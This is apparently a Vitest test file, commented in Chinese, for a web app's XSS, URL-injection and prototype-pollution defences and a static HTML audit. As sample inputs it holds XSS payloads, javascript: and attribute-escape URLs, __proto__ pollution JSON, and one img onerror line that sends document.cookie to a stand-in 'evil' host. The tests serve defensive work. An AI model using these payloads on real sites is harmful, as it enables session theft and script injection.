// src/security.test.js
// 資安漏洞掃描測試
import { describe, it, expect } from 'vitest';
import { readFileSync } from 'fs';
import { resolve } from 'path';
import {
    escapeHtml,
    sanitizeUrl,
    sanitizeForAttribute,
    detectPrototypePollution,
    stripDangerousKeys,
    validateSettingsSchema,
    auditHtmlFile,
    XSS_PAYLOADS,
    DANGEROUS_URLS,
} from './security.js';

// ============================================================
// 1. XSS 防護 — escapeHtml
// ============================================================
describe('escapeHtml — XSS 注入防護', () => {
    it('應轉義 < 和 > 避免 HTML tag 注入', () => {
        expect(escapeHtml('<script>alert(1)</script>')).not.toContain('<script>');
        expect(escapeHtml('<script>alert(1)</script>')).toBe(
            '&lt;script&gt;alert(1)&lt;&#x2F;script&gt;',
        );
    });

    it('應轉義雙引號避免屬性逃脫', () => {
        expect(escapeHtml('"><img onerror=alert(1)>')).not.toContain('"');
        expect(escapeHtml('"><img onerror=alert(1)>')).toBe(
            '&quot;&gt;&lt;img onerror=alert(1)&gt;',
        );
    });

    it('應轉義單引號', () => {
        expect(escapeHtml("' onfocus=alert(1)")).toBe('&#x27; onfocus=alert(1)');
    });

    it('應轉義 & 符號', () => {
        expect(escapeHtml('foo&bar')).toBe('foo&amp;bar');
    });

    it('應轉義反引號避免 template injection', () => {
        expect(escapeHtml('`${alert(1)}`')).toContain('&#96;');
    });

    it('所有常見 XSS payload 的 HTML 標籤都應被轉義', () => {
        XSS_PAYLOADS.forEach((payload) => {
            const escaped = escapeHtml(payload);
            // escapeHtml 轉義 <>&"'`/ 等字元，阻止瀏覽器解析為 HTML
            // onerror/onload 是純文字不需轉義，關鍵是 < > 被轉義後瀏覽器不會解析為標籤
            expect(escaped).not.toContain('<');
            expect(escaped).not.toContain('>');
        });
    });

    it('null/undefined 應回傳空字串', () => {
        expect(escapeHtml(null)).toBe('');
        expect(escapeHtml(undefined)).toBe('');
    });

    it('一般文字不受影響', () => {
        expect(escapeHtml('正常的中文文字')).toBe('正常的中文文字');
        expect(escapeHtml('hello world 123')).toBe('hello world 123');
    });
});

// ============================================================
// 2. URL Injection 防護 — sanitizeUrl
// ============================================================
describe('sanitizeUrl — URL 注入防護', () => {
    it('應允許合法的 http URL', () => {
        expect(sanitizeUrl('http://example.com')).toBe('http://example.com');
    });

    it('應允許合法的 https URL', () => {
        expect(sanitizeUrl('https://docs.google.com/spreadsheets/d/xxx')).toBe(
            'https://docs.google.com/spreadsheets/d/xxx',
        );
    });

    it('應阻擋 javascript: 協議', () => {
        expect(sanitizeUrl('javascript:alert(1)')).toBe('');
    });

    it('應阻擋 data: 協議', () => {
        expect(sanitizeUrl('data:text/html,<script>alert(1)</script>')).toBe('');
    });

    it('應阻擋 vbscript: 協議', () => {
        expect(sanitizeUrl('vbscript:alert(1)')).toBe('');
    });

    it('應阻擋含雙引號的 URL (屬性逃脫攻擊)', () => {
        expect(sanitizeUrl('http://evil.com" onclick="alert(1)')).toBe('');
    });

    it('應阻擋含單引號的 URL', () => {
        expect(sanitizeUrl("http://evil.com' onfocus='alert(1)")).toBe('');
    });

    it('應阻擋含 < > 的 URL', () => {
        expect(sanitizeUrl('http://evil.com/<script>')).toBe('');
    });

    it('所有危險 URL 向量都應被阻擋', () => {
        DANGEROUS_URLS.forEach((url) => {
            const result = sanitizeUrl(url);
            if (result !== '') {
                // 如果不為空，至少應該是合法的 http/https 且不含危險字元
                expect(result).toMatch(/^https?:\/\//);
                expect(result).not.toMatch(/["'<>]/);
            }
        });
    });

    it('null/undefined 應回傳空字串', () => {
        expect(sanitizeUrl(null)).toBe('');
        expect(sanitizeUrl(undefined)).toBe('');
    });

    it('應 trim 前後空白', () => {
        expect(sanitizeUrl('  https://example.com  ')).toBe('https://example.com');
    });
});

// ============================================================
// 3. HTML 屬性安全化 — sanitizeForAttribute
// ============================================================
describe('sanitizeForAttribute — 屬性注入防護', () => {
    it('應移除雙引號', () => {
        expect(sanitizeForAttribute('test"value')).toBe('testvalue');
    });

    it('應移除單引號', () => {
        expect(sanitizeForAttribute("test'value")).toBe('testvalue');
    });

    it('應移除尖括號', () => {
        expect(sanitizeForAttribute('test<img>value')).toBe('testimgvalue');
    });

    it('應移除 & 和反引號', () => {
        expect(sanitizeForAttribute('a&b`c')).toBe('abc');
    });

    it('應保留中文和英數', () => {
        expect(sanitizeForAttribute('王小明test123')).toBe('王小明test123');
    });

    it('null 應回傳空字串', () => {
        expect(sanitizeForAttribute(null)).toBe('');
    });
});

// ============================================================
// 4. Prototype Pollution 偵測
// ============================================================
describe('detectPrototypePollution — 原型鏈汙染偵測', () => {
    it('應偵測到最上層的 __proto__', () => {
        const obj = JSON.parse('{"__proto__": {"polluted": true}}');
        const findings = detectPrototypePollution(obj);
        expect(findings).toContain('__proto__');
    });

    it('應偵測到巢狀的 __proto__', () => {
        const obj = { nested: { __proto__: { admin: true } } };
        // Note: __proto__ in object literal is special, use JSON.parse
        const obj2 = JSON.parse('{"nested": {"__proto__": {"admin": true}}}');
        const findings = detectPrototypePollution(obj2);
        expect(findings).toContain('nested.__proto__');
    });

    it('應偵測到 constructor 鍵', () => {
        const obj = JSON.parse('{"constructor": {"prototype": {"polluted": true}}}');
        const findings = detectPrototypePollution(obj);
        expect(findings).toContain('constructor');
        expect(findings).toContain('constructor.prototype');
    });

    it('安全物件應回傳空陣列', () => {
        expect(detectPrototypePollution({ alias: 'test', originals: ['a'] })).toEqual([]);
    });

    it('null/undefined 應回傳空陣列', () => {
        expect(detectPrototypePollution(null)).toEqual([]);
        expect(detectPrototypePollution(undefined)).toEqual([]);
    });
});

describe('stripDangerousKeys — 移除危險 key', () => {
    it('應移除 __proto__ key', () => {
        const obj = JSON.parse('{"__proto__": {"polluted": true}, "safe": "value"}');
        const clean = stripDangerousKeys(obj);
        expect(clean).toEqual({ safe: 'value' });
        // clean.__proto__ 存取的是 Object.prototype (JS 內建)，不是被注入的值
        // 正確的檢查方式是確認 Object.keys 不含 __proto__
        expect(Object.keys(clean)).not.toContain('__proto__');
        expect(clean).not.toHaveProperty('polluted');
    });

    it('應保留正常的 key', () => {
        const obj = { alias: 'test', originals: ['a', 'b'] };
        expect(stripDangerousKeys(obj)).toEqual(obj);
    });

    it('應遞迴移除巢狀危險 key', () => {
        const obj = JSON.parse('{"nested": {"constructor": "evil", "safe": "ok"}}');
        const clean = stripDangerousKeys(obj);
        expect(clean.nested.safe).toBe('ok');
        expect(Object.keys(clean.nested)).not.toContain('constructor');
    });

    it('應處理陣列', () => {
        const obj = JSON.parse('[{"__proto__": "bad", "ok": 1}]');
        const clean = stripDangerousKeys(obj);
        expect(clean[0].ok).toBe(1);
        expect(Object.keys(clean[0])).not.toContain('__proto__');
    });
});

// ============================================================
// 5. Settings Schema 驗證
// ============================================================
describe('validateSettingsSchema — 設定匯入驗證', () => {
    it('合法設定應驗證通過', () => {
        const data = {
            projectMerges: [{ alias: 'A', originals: ['B', 'C'] }],
            groupMerges: [{ alias: 'X', originals: ['Y'] }],
        };
        const result = validateSettingsSchema(data);
        expect(result.valid).toBe(true);
        expect(result.errors).toHaveLength(0);
    });

    it('null 應驗證失敗', () => {
        const result = validateSettingsSchema(null);
        expect(result.valid).toBe(false);
    });

    it('缺少 alias 應驗證失敗', () => {
        const data = { projectMerges: [{ originals: ['A'] }] };
        const result = validateSettingsSchema(data);
        expect(result.valid).toBe(false);
        expect(result.errors.some((e) => e.includes('alias'))).toBe(true);
    });

    it('originals 包含非字串應驗證失敗', () => {
        const data = { projectMerges: [{ alias: 'A', originals: [123, null] }] };
        const result = validateSettingsSchema(data);
        expect(result.valid).toBe(false);
        expect(result.errors.some((e) => e.includes('非字串'))).toBe(true);
    });

    it('projectMerges 不是陣列應驗證失敗', () => {
        const data = { projectMerges: 'not an array' };
        const result = validateSettingsSchema(data);
        expect(result.valid).toBe(false);
    });

    it('含 __proto__ 的匯入資料應驗證失敗', () => {
        const data = JSON.parse(
            '{"projectMerges": [], "__proto__": {"polluted": true}}',
        );
        const result = validateSettingsSchema(data);
        expect(result.valid).toBe(false);
        expect(result.errors.some((e) => e.includes('危險'))).toBe(true);
    });

    it('完全空物件 (無 projectMerges 或 groupMerges) 應驗證失敗', () => {
        const result = validateSettingsSchema({ foo: 'bar' });
        expect(result.valid).toBe(false);
    });

    it('只有 groupMerges 也應驗證通過', () => {
        const data = { groupMerges: [{ alias: '品檢', originals: ['品檢組'] }] };
        const result = validateSettingsSchema(data);
        expect(result.valid).toBe(true);
    });
});

// ============================================================
// 6. 靜態 HTML 掃描 — auditHtmlFile
// ============================================================
describe('auditHtmlFile — 靜態掃描 index.html', () => {
    let htmlContent;

    // 讀取實際的 index.html
    try {
        htmlContent = readFileSync(resolve(__dirname, '../index.html'), 'utf-8');
    } catch {
        htmlContent = null;
    }

    it('應能讀取 index.html', () => {
        expect(htmlContent).not.toBeNull();
        expect(htmlContent.length).toBeGreaterThan(0);
    });

    it('應偵測到 innerHTML 使用 (XSS 風險)', () => {
        if (!htmlContent) return;
        const findings = auditHtmlFile(htmlContent);
        const xssFindings = findings.filter(
            (f) => f.category === 'XSS' && f.message.includes('innerHTML'),
        );
        expect(xssFindings.length).toBeGreaterThan(0);
    });

    it('應偵測到外部 script 缺少 SRI', () => {
        if (!htmlContent) return;
        const findings = auditHtmlFile(htmlContent);
        const sriFindings = findings.filter((f) => f.category === 'SRI');
        // tailwindcss, chart.js, localforage 三個 CDN script 都缺少 SRI
        expect(sriFindings.length).toBeGreaterThanOrEqual(3);
    });

    it('CSP meta 已加入，不應偵測到缺少 CSP 問題', () => {
        if (!htmlContent) return;
        const findings = auditHtmlFile(htmlContent);
        const cspFindings = findings.filter((f) => f.category === 'CSP');
        expect(cspFindings.length).toBe(0);
    });

    it('應偵測到 target="_blank" 缺少 rel="noopener"', () => {
        if (!htmlContent) return;
        const findings = auditHtmlFile(htmlContent);
        const tabFindings = findings.filter((f) => f.category === 'TABNABBING');
        expect(tabFindings.length).toBeGreaterThan(0);
    });

    it('所有發現的嚴重度應為 HIGH / MEDIUM / LOW', () => {
        if (!htmlContent) return;
        const findings = auditHtmlFile(htmlContent);
        findings.forEach((f) => {
            expect(['HIGH', 'MEDIUM', 'LOW']).toContain(f.severity);
        });
    });

    it('應產出完整的掃描報告', () => {
        if (!htmlContent) return;
        const findings = auditHtmlFile(htmlContent);
        // 彙總
        const highCount = findings.filter((f) => f.severity === 'HIGH').length;
        const medCount = findings.filter((f) => f.severity === 'MEDIUM').length;
        const lowCount = findings.filter((f) => f.severity === 'LOW').length;

        console.log('\n========== 資安掃描報告 ==========');
        console.log(`🔴 高風險: ${highCount} 個`);
        console.log(`🟡 中風險: ${medCount} 個`);
        console.log(`🟢 低風險: ${lowCount} 個`);
        console.log(`📊 合計:   ${findings.length} 個發現\n`);

        findings.forEach((f) => {
            const icon = f.severity === 'HIGH' ? '🔴' : f.severity === 'MEDIUM' ? '🟡' : '🟢';
            const loc = f.line ? `L${f.line}` : '全域';
            console.log(`  ${icon} [${f.category}] ${loc}: ${f.message}`);
        });
        console.log('==================================\n');

        expect(findings.length).toBeGreaterThan(0);
    });
});

// ============================================================
// 7. 模擬實際攻擊場景測試
// ============================================================
describe('模擬攻擊場景 — Google Sheet 惡意資料注入', () => {
    it('模擬 XSS: 專案名稱含 script tag → escapeHtml 應阻擋', () => {
        const maliciousProject = '<script>document.cookie</script>';
        const escaped = escapeHtml(maliciousProject);
        expect(escaped).not.toContain('<script>');
        expect(escaped).toBe('&lt;script&gt;document.cookie&lt;&#x2F;script&gt;');
    });

    it('模擬 XSS: 人員名稱含 img onerror → escapeHtml 應將標籤轉義', () => {
        const maliciousName = '張三<img src=x onerror=fetch("http://evil/"+document.cookie)>';
        const escaped = escapeHtml(maliciousName);
        // < > 被轉義，瀏覽器不會解析為 img 標籤，onerror 不會執行
        expect(escaped).not.toContain('<');
        expect(escaped).not.toContain('>');
        expect(escaped).toContain('&lt;img');
    });

    it('模擬 XSS: 回應內容含 SVG onload → escapeHtml 應阻擋', () => {
        const maliciousContent = '工作事項<svg/onload=alert(document.domain)>';
        const escaped = escapeHtml(maliciousContent);
        expect(escaped).not.toContain('<svg');
    });

    it('模擬 URL Injection: 連結欄位含 javascript: → sanitizeUrl 應阻擋', () => {
        const maliciousLink = 'javascript:alert(document.cookie)';
        expect(sanitizeUrl(maliciousLink)).toBe('');
    });

    it('模擬 URL Injection: 連結含屬性逃脫 → sanitizeUrl 應阻擋', () => {
        const maliciousLink = 'http://legit.com" onmouseover="alert(1)" data-x="';
        expect(sanitizeUrl(maliciousLink)).toBe('');
    });

    it('模擬 Prototype Pollution: 匯入設定含 __proto__ → 應被偵測', () => {
        const maliciousSettings = JSON.parse(
            '{"projectMerges":[],"__proto__":{"isAdmin":true}}',
        );
        const pollution = detectPrototypePollution(maliciousSettings);
        expect(pollution.length).toBeGreaterThan(0);
        expect(pollution).toContain('__proto__');
    });

    it('模擬 Prototype Pollution: 清理後應安全', () => {
        const malicious = JSON.parse(
            '{"projectMerges":[],"__proto__":{"isAdmin":true},"groupMerges":[]}',
        );
        const clean = stripDangerousKeys(malicious);
        expect(Object.keys(clean)).not.toContain('__proto__');
        expect(clean.projectMerges).toEqual([]);
        expect(clean.groupMerges).toEqual([]);
    });

    it('模擬 Settings Injection: originals 含可執行字串 → schema 驗證應標記', () => {
        const data = {
            projectMerges: [
                {
                    alias: '<img onerror=alert(1)>',
                    originals: ['normal'],
                },
            ],
        };
        // schema 本身允許 (是字串)，但 escapeHtml 應在渲染時阻擋
        const result = validateSettingsSchema(data);
        // Schema 驗證通過 (因為 alias 是字串)
        expect(result.valid).toBe(true);
        // 但渲染前 escapeHtml 會阻擋
        expect(escapeHtml(data.projectMerges[0].alias)).not.toContain('<img');
    });
});
